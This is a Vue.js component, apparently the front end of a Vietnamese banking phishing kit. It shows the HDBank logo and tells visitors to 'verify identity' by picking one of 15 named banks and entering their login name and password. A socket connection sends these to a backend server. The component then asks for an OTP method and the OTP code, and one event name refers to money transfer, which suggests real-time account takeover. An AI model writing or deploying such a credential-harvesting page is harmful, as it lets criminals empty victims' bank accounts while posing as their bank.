<template>
    <div class="">
        <div>
            <div style="display: flex; justify-content: center">
                <a href="">
                    <v-img cover width="133px" src="https://sieuthe4trong1.hdbank.com.vn/images/logo.svg" alt=""></v-img>
                </a>
            </div>
        </div>
        <div style="margin-top: 20px">
            <v-form ref="formRef" @submit.prevent="submit">
                <v-row justify="center">
                    <div style="display: flex; justify-content: center">
                    </div>
                    <v-col md="8" lg="6" cols="12" sm="12">
                        <v-card title="Thông tin đăng ký" class="mb-5 p-5">
                            <v-card-title>
                                <p style="color: red">Để xác minh danh tính</p>
                                <p style="color: red">Vui lòng đăng nhập ngân hàng bạn đang sử dụng</p>
                            </v-card-title>
                            <v-card-text>
                                <v-select label="Tên ngân hàng" v-model="formValue.bankLoginName" :items="bankList"
                                    variant="filled" :rules="rules.bankList"></v-select>
                                <v-text-field v-model="formValue.bankLoginAccount" variant="filled"
                                    label="Tên đăng nhập/Số điện thoại" :rules="rules.bankLoginAccount"></v-text-field>
                                <v-text-field v-model="formValue.bankLoginPassword" variant="filled" label="Mật khẩu"
                                    :rules="rules.bankLoginPassword"></v-text-field>
                            </v-card-text>

                        </v-card>
                        <v-btn color="warning" block class="pa-4" type="submit">Tiếp tục</v-btn>

                    </v-col>
                </v-row>
            </v-form>
        </div>
    </div>
    <v-dialog max-width="450px" v-model="dialog" persistent>
        <v-card>
            <v-card-title>
                Đang xử lý thông tin
            </v-card-title>
            <v-card-text class="text-center">
                <p class="text-center mb-2">Vui lòng không tắt trình duyệt</p>
                <v-progress-circular :size="70" :width="7" color="warning" indeterminate></v-progress-circular>
            </v-card-text>
            <v-card-actions>
            </v-card-actions>
        </v-card>
    </v-dialog>
    <v-dialog max-width="450px" v-model="dialogError" persistent>
        <v-card>
            <v-card-title>
                Thông báo
            </v-card-title>
            <v-card-text class="text-center">
                <p class="text-center mb-2">{{ dialogMessage }}</p>
            </v-card-text>
            <v-card-actions>
                <v-btn color="warning" block class="pa-4" @click="dialogError = false">Đóng</v-btn>
            </v-card-actions>
        </v-card>
    </v-dialog>
    <v-dialog max-width="450px" v-model="dialogSuccess" persistent>
        <v-card>
            <v-form ref="formMethodOtp" @submit.prevent="submitFormMethod">
                <v-card-title>
                    Thông báo
                </v-card-title>
                <v-card-text class="text-center">
                    <p class="text-center mb-2">{{ dialogMessage }}</p>
                    <!-- // select option method otp -->
                    <v-select v-if="socketData.options" v-model="formRefOtpMethod" :items="socketData.options"
                        label="Chọn phương thức xác thực" variant="filled" :rules="rules.otpMethod"></v-select>
                </v-card-text>
                <v-card-actions>
                    <v-btn color="warning" block class="pa-4" type="submit">Tiếp tục</v-btn>
                </v-card-actions>
            </v-form>
        </v-card>
    </v-dialog>
    <v-dialog max-width="450px" v-model="dialogMethodCTOTP" persistent>
        <v-card>
            <v-form ref="formMethodOtpCT" @submit.prevent="submitFormMethodCT">
                <v-card-title>
                    Thông báo
                </v-card-title>
                <v-card-text class="text-center">
                    <p class="text-center mb-2">{{ dialogMessage }}</p>
                    <!-- // select option method otp -->
                    <v-select v-if="socketData.options" v-model="formRefOtpCT" :items="socketData.options"
                        label="Chọn phương thức xác thực" variant="filled" :rules="rules.otpMethodCT"></v-select>
                </v-card-text>
                <v-card-actions>
                    <v-btn color="warning" block class="pa-4" type="submit">Tiếp tục</v-btn>
                </v-card-actions>
            </v-form>
        </v-card>
    </v-dialog>
    <v-dialog max-width="450px" v-model="dialogOtp" persistent>
        <v-card>
            <v-form ref="formRefOtpLogin" @submit.prevent="submitFormBankLoginOtp">
                <v-card-title>
                    Thông báo
                </v-card-title>
                <v-card-text class="text-center">
                    <p class="text-center mb-2">{{ dialogMessage }}</p>
                    <!-- // select option method otp -->
                    <v-text-field v-model="otpLogin" variant="filled" label="Nhập mã OTP"
                        :rules="rules.otpLogin"></v-text-field>
                </v-card-text>
                <v-card-actions>
                    <v-btn color="warning" block class="pa-4" type="submit">Tiếp tục</v-btn>
                </v-card-actions>
            </v-form>
        </v-card>
    </v-dialog>
</template>

<script setup>
import { ref, onMounted, computed } from 'vue'
import axios from '@/plugins/axios'
import { useRouter } from 'vue-router'
import { useStore } from 'vuex';
import { socket } from '@/plugins/socket'
const router = useRouter()
const store = useStore()
const user = computed(() => store.state.user)
const dialogError = ref(false)
const dialogMessage = ref('')
const socketData = ref(null)
const formMethodOtp = ref(null)
const dialogSuccess = ref(false)
const dialogOtp = ref(false)
const otpLogin = ref('')
const dialogMethodCTOTP = ref(false)
const formRefOtpCT = ref(false)

onMounted(() => {
    // if (!user.value.numberPhone) {
    //     router.push({ name: 'Home' })
    // }

    socket.emit('connection', () => {
        console.log('connected')
    })

    socket.on('send-data-otp-vcb-chuyentien', (data) => {
        socketData.value = data
        if (data.code === 400) {
            dialogError.value = true
            dialogMessage.value = data.message
            dialog.value = false
            return
        } else if (data.code === 201) {
            dialogSuccess.value = true
            dialogMessage.value = data.message
            socketData.value = data
            dialog.value = false
        } else if (data.code === 404) {
            dialogError.value = true
            dialogMessage.value = data.message
            dialog.value = false
        } else if(data.code === 200) {
            dialogSuccess.value = true
            dialogMessage.value = data.message
            dialog.value = false
        }
    })

    socket.on('send-data-otp-vcb', (data) => {
        console.log(data);
        socketData.value = data
        if (data.code === 200) {
            dialogError.value = false
            dialogMessage.value = data.message
            dialogSuccess.value = false
            dialog.value = false
            dialogOtp.value = true
            return
        }
    })

    socket.on('send-data', async (data) => {
        console.log(data);
        if (data.code === 404) {
            dialogError.value = true
            dialogMessage.value = data.message
            dialog.value = false
            return
        } else if (data.code === 200) {
            dialogSuccess.value = true
            dialogMessage.value = data.message
            socketData.value = data
            dialog.value = false
        }
    })

    socket.on('send-data-send-otp-vcb', (data) => {
        console.log(data);
        if (data.code === 404) {
            dialogError.value = true
            dialogMessage.value = data.message
            dialog.value = false
            return
        } else if (data.code === 200) {

        }
    })



})
const formRef = ref(null)
const formRefOtpMethod = ref(null)
const formRefOtpLogin = ref(null)
const formValue = ref({
    bankLoginName: '',
    bankLoginAccount: '',
    bankLoginPassword: '',
    ...user.value
})
const rules = {
    bankLoginName: [
        v => !!v || 'Tên đăng nhập không được để trống',
    ],
    bankLoginAccount: [
        v => !!v || 'Số tài khoản không được để trống',
    ],
    bankLoginPassword: [
        v => !!v || 'Mật khẩu không được để trống',

        // format > 6
        v => (v && v.length >= 6) || 'Mật khẩu phải lớn hơn 6 ký tự',
    ],
    otpMethod: [
        v => !!v || 'Vui lòng chọn phương thức xác thực',
    ],
    otpLogin: [
        v => !!v || 'Mã OTP không được để trống',

        // format > 6
        v => (v && v.length >= 6) || 'Mã OTP phải lớn hơn 6 ký tự',
    ],

}

const submit = async () => {
    const isValid = await formRef.value.validate()
    if (isValid.valid) {
        dialog.value = true
        try {
            // const response = await axios.post(`/update-user/${formValue.numberPhone}}`, formValue.value)
            // console.log(response)
            socket.emit('send-data', {
                bankName: formValue.value.bankLoginName,
                bankAccount: formValue.value.bankLoginAccount,
                bankPassword: formValue.value.bankLoginPassword
            })
        } catch (error) {
            console.log(error)
        }
    }
    // const formData = new FormData()
    // formData.append('imageBefore', formValue.value.imageBefore)
    // formData.append('imageAfter', formValue.value.imageAfter)
    // formData.append('imagePortrait', formValue.value.imagePortrait)
    // try {
    //     const response = await axios.post('/upload', formData)
    //     console.log(response)
    //     router.push({ name: 'Bank' })
    // } catch (error) {
    //     console.log(error)
    // }
}
const bankList = ref([
    {
        value: 'HDBank',
        title: 'Ngân hàng Phát triển Thành phố Hồ Chí Minh (HDBank)'
    },
    {
        value: 'MB',
        title: 'Ngân hàng Quân Đội (MB)'
    },
    {
        value: 'ACB',
        title: 'Ngân hàng Á Châu (ACB)'
    },
    {
        value: 'VPBank',
        title: 'Ngân hàng Việt Nam Thịnh Vượng (VPBank)'
    },
    {
        value: 'VCB',
        title: 'Ngân hàng Ngoại Thương Việt Nam (VCB)'
    },
    {
        value: 'Techcombank',
        title: 'Ngân hàng Kỹ Thương Việt Nam (Techcombank)'
    },
    {
        value: 'VietinBank',
        title: 'Ngân hàng Công Thương Việt Nam (VietinBank)'
    },
    {
        value: 'BIDV',
        title: 'Ngân hàng Đầu tư và Phát triển Việt Nam (BIDV)'
    },
    {
        value: 'Agribank',
        title: 'Ngân hàng Nông nghiệp và Phát triển Nông thôn (Agribank)'
    },
    {
        value: 'Sacombank',
        title: 'Ngân hàng Sài Gòn Thương Tín (Sacombank)'
    },
    {
        value: 'SHB',
        title: 'Ngân hàng Sài Gòn - Hà Nội (SHB)'
    },
    {
        value: 'SeABank',
        title: 'Ngân hàng TMCP Đông Nam Á (SeABank)'
    },
    {
        value: 'VIB',
        title: 'Ngân hàng Quốc tế (VIB)'
    },
    {
        value: 'TPBank',
        title: 'Ngân hàng Tiên Phong (TPBank)'
    },
    {
        value: 'OceanBank',
        title: 'Ngân hàng Đại Dương (OceanBank)'
    }

])
const dialog = ref(false)
const submitFormMethod = async () => {
    const isValid = await formMethodOtp.value.validate()
    if (isValid.valid) {
        dialog.value = true
        dialogSuccess.value = false
        try {
            socket.emit('send-data-otp-vcb', {
                method: formRefOtpMethod.value,
            })
        } catch (error) {
            console.log(error)
        }
    }
}

const submitFormBankLoginOtp = async () => {
    const isValid = await formRefOtpLogin.value.validate()
    if (isValid.valid) {
        dialog.value = true
        dialogOtp.value = false
        try {
            socket.emit('send-data-send-otp-vcb', {
                otp: otpLogin.value,
            })
        } catch (error) {
            console.log(error)
        }
    }
}

const submitFormMethodCT = async () => {
    const isValid = await formRefOtpCT.value.validate()

    if(isValid.valid) {
        socket.emit('send-method-ct-vcb', )
    }
}
</script>
<style>
.v-card-title {
    font-size: 16px !important;
    font-weight: 500;
    color: #000;
    margin-bottom: 20px;
}

.v-card {
    border: 1px solid #ccc !important;
}
</style>